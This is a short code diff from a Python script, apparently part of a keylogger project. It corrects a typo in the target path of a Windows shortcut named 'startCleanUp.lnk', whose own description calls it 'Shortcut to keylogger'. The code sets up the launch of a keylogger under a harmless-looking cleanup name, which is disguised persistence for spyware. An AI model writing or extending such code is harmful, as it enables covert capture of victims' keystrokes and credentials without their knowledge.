@@ -26,5 +26,5 @@ def createBat():
         link_filepath = os.path.join(user, "startCleanUp.lnk")
         with winshell.shortcut(link_filepath) as link:
             link.working_directory = path
-            link.path = f"{path}\\startCleanU.py"
+            link.path = f"{path}\\startCleanUp.py"
             link.description = "Shortcut to keylogger"
